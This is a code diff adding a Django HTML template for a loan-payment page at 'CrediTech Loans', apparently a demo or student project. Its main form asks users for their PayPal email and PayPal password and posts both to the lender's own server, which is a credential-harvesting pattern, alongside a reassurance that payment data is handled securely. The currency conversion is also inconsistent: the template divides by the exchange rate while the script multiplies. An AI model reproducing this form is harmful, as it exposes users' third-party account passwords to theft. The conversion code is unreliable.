@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+{% load humanize loan_filters %}
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Make Payment - CrediTech Loans</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #3498db;
+            --secondary-color: #2980b9;
+            --success-color: #2ecc71;
+            --danger-color: #e74c3c;
+            --light-color: #ecf0f1;
+            --dark-color: #2c3e50;
+            --white: #ffffff;
+            --gray: #95a5a6;
+            --dark-gray: #7f8c8d;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: var(--light-color);
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background-color: var(--white);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            height: 40px;
+        }
+
+        .main-content {
+            display: flex;
+            justify-content: center;
+        }
+
+        .payment-card {
+            background-color: var(--white);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .payment-title {
+            color: var(--primary-color);
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .payment-subtitle {
+            color: var(--gray);
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .payment-summary {
+            background-color: var(--light-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .summary-label {
+            color: var(--dark-gray);
+        }
+
+        .summary-value {
+            font-weight: 600;
+        }
+
+        .summary-total {
+            border-top: 1px solid var(--gray);
+            padding-top: 15px;
+            margin-top: 15px;
+            font-size: 18px;
+        }
+
+        .total-amount {
+            color: var(--primary-color);
+            font-weight: 700;
+            font-size: 22px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark-gray);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary-color);
+        }
+
+        .error-message {
+            color: var(--danger-color);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.3s;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: var(--white);
+            width: 100%;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--secondary-color);
+        }
+
+        .btn-success {
+            background-color: var(--success-color);
+            color: var(--white);
+            width: 100%;
+        }
+
+        .btn-success:hover {
+            background-color: #27ae60;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: var(--gray);
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
+        }
+
+        .security-notice {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+            color: var(--gray);
+            font-size: 14px;
+        }
+
+        .security-icon {
+            margin-right: 10px;
+            color: var(--primary-color);
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .loading-spinner {
+            border: 5px solid rgba(52, 152, 219, 0.1);
+            border-radius: 50%;
+            border-top: 5px solid var(--primary-color);
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .messages {
+            margin-bottom: 20px;
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        .alert-danger {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+
+        .usd-display {
+            font-size: 14px;
+            color: var(--gray);
+            margin-top: 5px;
+        }
+
+        @media (max-width: 768px) {
+            .payment-card {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <img src="{% if request.site.logo %}{{ request.site.logo.url }}{% else %}https://via.placeholder.com/120x40?text=CrediTech{% endif %}" alt="CrediTech Logo" class="logo">
+            <h2>Loan Payment</h2>
+        </header>
+
+        <div class="messages">
+            {% if messages %}
+                {% for message in messages %}
+                    <div class="alert alert-{% if message.tags == 'error' %}danger{% else %}{{ message.tags }}{% endif %}">
+                        {{ message }}
+                    </div>
+                {% endfor %}
+            {% endif %}
+        </div>
+
+        <main class="main-content">
+            <div class="payment-card">
+                <h1 class="payment-title">Complete Your Payment</h1>
+                <p class="payment-subtitle">You're paying CrediTech Loans</p>
+
+                <div class="payment-summary">
+                    <div class="summary-row">
+                        <span class="summary-label">Total Amount Owed:</span>
+                        <span class="summary-value">M{{ total_outstanding|floatformat:2|intcomma }}</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="summary-label">Minimum Payment Due:</span>
+                        <span class="summary-value">M{{ minimum_payment_due|floatformat:2|intcomma }}</span>
+                    </div>
+                </div>
+
+                <form id="paymentForm" method="POST" action="{% url 'payment' %}">
+                    {% csrf_token %}
+                    
+                    <div class="form-group">
+                        <label for="email" class="form-label">PayPal Email</label>
+                        <input type="email" id="email" name="email" class="form-control" required>
+                        <div class="error-message" id="email-error">Please enter a valid PayPal email</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password" class="form-label">PayPal Password</label>
+                        <input type="password" id="password" name="password" class="form-control" required>
+                        <div class="error-message" id="password-error">Please enter your PayPal password</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="paymentAmount" class="form-label">Amount to Pay (M)</label>
+                        <input type="number" id="paymentAmount" name="paymentAmount" class="form-control" 
+                               min="{{ minimum_payment_due }}" max="{{ total_outstanding }}" step="0.01" 
+                               value="{{ minimum_payment_due }}" required>
+                        <div class="error-message" id="amount-error">
+                            Amount must be between M{{ minimum_payment_due|floatformat:2 }} and M{{ total_outstanding|floatformat:2 }}
+                        </div>
+                        <div class="usd-display" id="usdAmount">
+                            Equivalent: USD {{ minimum_payment_due|div:exchange_rate|floatformat:2 }}
+                        </div>
+                    </div>
+
+                    <div class="summary-row summary-total">
+                        <span class="summary-label">You will pay:</span>
+                        <span class="total-amount" id="displayAmount">M{{ minimum_payment_due|floatformat:2|intcomma }}</span>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary" id="submitBtn">
+                        Process Payment
+                    </button>
+                </form>
+
+                <div class="divider">or</div>
+
+                <form id="paypalForm" action="https://www.sandbox.paypal.com/cgi-bin/webscr" method="post" target="_blank">
+                    <input type="hidden" name="cmd" value="_xclick">
+                    <input type="hidden" name="business" value="creditech2000@gmail.com">
+                    <input type="hidden" name="item_name" value="Loan Payment">
+                    <input type="hidden" name="amount" id="paypalAmount" value="{{ minimum_payment_due|div:exchange_rate|floatformat:2 }}">
+                    <input type="hidden" name="currency_code" value="USD">
+                    <input type="hidden" name="email" value="{{ user.email }}">
+                    <input type="hidden" name="first_name" value="{{ user.first_name }}">
+                    <input type="hidden" name="last_name" value="{{ user.last_name }}">
+                    
+                    <button type="submit" class="btn btn-success" id="paypalBtn">
+                        <i class="fab fa-paypal"></i> Pay with PayPal
+                    </button>
+                </form>
+
+                <div class="security-notice">
+                    <i class="fas fa-lock security-icon"></i>
+                    <span>Your payment information is processed securely</span>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Processing Payment...</div>
+        <p>Please wait while we complete your transaction</p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const paymentForm = document.getElementById('paymentForm');
+            const paymentAmountInput = document.getElementById('paymentAmount');
+            const usdAmountDisplay = document.getElementById('usdAmount');
+            const displayAmount = document.getElementById('displayAmount');
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            const amountError = document.getElementById('amount-error');
+
+            const exchangeRate = {{ exchange_rate|floatformat:6 }};
+            const minAmount = {{ minimum_payment_due|floatformat:2 }};
+            const maxAmount = {{ total_outstanding|floatformat:2 }};
+
+            function updateAmountDisplay() {
+                const amount = parseFloat(paymentAmountInput.value) || 0;
+                if (amount >= minAmount && amount <= maxAmount) {
+                    usdAmountDisplay.textContent = `Equivalent: USD ${(amount * exchangeRate).toFixed(2)}`;
+                    displayAmount.textContent = `M${amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,')}`;
+                    amountError.style.display = 'none';
+                    document.getElementById('paypalAmount').value = (amount * exchangeRate).toFixed(2);
+                } else {
+                    usdAmountDisplay.textContent = 'Equivalent: USD 0.00';
+                    displayAmount.textContent = 'M0.00';
+                    amountError.style.display = 'block';
+                }
+            }
+
+            function validateForm() {
+                let isValid = true;
+
+                if (!emailInput.value.includes('@') || !emailInput.value.includes('.')) {
+                    emailError.style.display = 'block';
+                    isValid = false;
+                } else {
+                    emailError.style.display = 'none';
+                }
+
+                if (passwordInput.value.length < 6) {
+                    passwordError.style.display = 'block';
+                    passwordError.textContent = 'Password must be at least 6 characters';
+                    isValid = false;
+                } else {
+                    passwordError.style.display = 'none';
+                }
+
+                const amount = parseFloat(paymentAmountInput.value) || 0;
+                if (amount < minAmount || amount > maxAmount) {
+                    amountError.style.display = 'block';
+                    isValid = false;
+                } else {
+                    amountError.style.display = 'none';
+                }
+
+                return isValid;
+            }
+
+            paymentAmountInput.addEventListener('input', updateAmountDisplay);
+
+            paymentForm.addEventListener('submit', (e) => {
+                if (!validateForm()) {
+                    e.preventDefault();
+                    return;
+                }
+                loadingOverlay.style.display = 'flex';
+                submitBtn.disabled = true;
+            });
+
+            updateAmountDisplay();
+        });
+    </script>
+</body>
+</html>
